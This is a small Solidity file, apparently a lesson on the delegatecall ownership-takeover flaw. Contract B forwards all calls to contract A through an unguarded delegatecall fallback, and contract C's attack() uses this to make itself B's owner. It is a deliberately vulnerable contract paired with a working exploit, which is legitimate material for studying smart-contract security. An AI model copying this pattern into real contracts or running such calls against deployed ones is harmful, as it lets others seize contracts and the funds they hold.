//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract A {
    address public owner;

    function setOwner() public {
        owner = msg.sender;
        console.log("msg.sender", msg.sender);
    }
}

contract B {
    address public owner;
    A public a;

    constructor(A _a) {
        owner = msg.sender;
        a = A(_a);
    }

    fallback() external payable {
        address(a).delegatecall(msg.data);
    }
}

contract C {
    address public b;

    constructor(address _b) {
        b = _b;
    }

    function attack() public {
        b.call(abi.encodeWithSignature("setOwner()"));
    }
}
